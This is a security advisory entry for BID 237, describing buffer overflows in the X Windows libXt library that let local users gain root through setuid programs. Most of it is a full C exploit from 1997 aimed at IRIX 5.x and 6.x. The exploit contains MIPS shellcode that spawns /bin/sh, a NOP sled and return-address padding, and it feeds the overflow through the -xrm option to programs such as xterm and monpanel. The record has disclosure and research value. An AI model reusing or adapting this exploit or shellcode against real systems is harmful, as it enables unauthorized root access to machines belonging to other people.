source: http://www.securityfocus.com/bid/237/info

The libXt library is part of the X Windows system. There are several buffer overflow conditions that may allow an unauthorized user to gain root privileges through setuid and setgid programs that are linked to libXt. These problems were openly discussed on the Bugtraq mailing list in 1996, this discussion led the OpenGroup (maintainers of the X-Windowing System) to release a new version of X Windows which was more thoroughly audited and which hopefully addressed a series of buffer overflows. 


                /*## copyright LAST STAGE OF DELIRIUM jan 1997 poland        *://lsd-pl.net/ #*/
                /*## libxt.so -xrm                                                           #*/

                #define NOPNUM 8000
                #define ADRNUM 2000
                #define PCHNUM 2000
                #define TMPNUM 2000
                #define ALLIGN 3

                char shellcode[]=
                    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
                    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
                    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
                    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
                    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
                    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
                    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
                    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
                    "\x03\xff\xff\xcc"    /* syscall                      */
                    "/bin/sh"
                ;

                char jump[]=
                    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
                    "\x03\xe0\x00\x08"    /* jr      $ra                  */
                ;

                char nop[]="\x24\x0f\x12\x34";

                main(int argc,char **argv){
                    char buffer[20000],adr[4],pch[4],tmp[4],*b;
                    int i,n=-1;

                    printf("copyright LAST STAGE OF DELIRIUM jan 1997 poland  //lsd-pl.net/\n");
                    printf("libxt.so -xrm for irix 5.2 5.3 6.2 6.3 IP:17,19,20,21,22,32\n\n");

                    if(argc!=2){
                        printf("usage: %s {monpanel|printers|dmplay|datman|xwsh|cdplayer|"
                            "xconsole|xterm}\n",argv[0]);
                        exit(-1);
                    }
                    if(!strcmp(argv[1],"monpanel")) n=0;
                    if(!strcmp(argv[1],"printers")) n=1;
                    if(!strcmp(argv[1],"dmplay")) n=2;
                    if(!strcmp(argv[1],"datman")) n=3;
                    if(!strcmp(argv[1],"xwsh")) n=4;
                    if(!strcmp(argv[1],"cdplayer")) n=5;
                    if(!strcmp(argv[1],"xconsole")) n=6;
                    if(!strcmp(argv[1],"xterm")) n=7;
                    if(n==-1) exit(-1);

                    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+15000+8000;
                    *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+15000+15300+1000;
                    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+15000+15300+1000+2000;

                    b=buffer;
                    for(i=0;i<ALLIGN;i++) *b++=0xff;
                    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
                    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
                    *b++=0xff;
                    *b++=0xff;
                    for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
                    for(i=0;i<ALLIGN;i++) *b++=0xff;
                    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
                    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
                    *b=0;

                    switch(n){
                    case 0: execl("/usr/sbin/monpanel","lsd","-xrm",buffer,0);
                    case 1: execl("/usr/sbin/printers","lsd","-xrm",buffer,0);
                    case 2: execl("/usr/sbin/dmplay","lsd","-xrm",buffer,0);
                    case 3: execl("/usr/sbin/datman","lsd","-xrm",buffer,0);
                    case 4: execl("/usr/sbin/xwsh","lsd","-xrm",buffer,0);
                    case 5: execl("/usr/bin/X11/cdplayer","lsd","-xrm",buffer,0);
                    case 6: execl("/usr/bin/X11/xconsole","lsd","-xrm",buffer,0);
                    case 7: execl("/usr/bin/X11/xterm","lsd","-xrm",buffer,0);
                    }
                }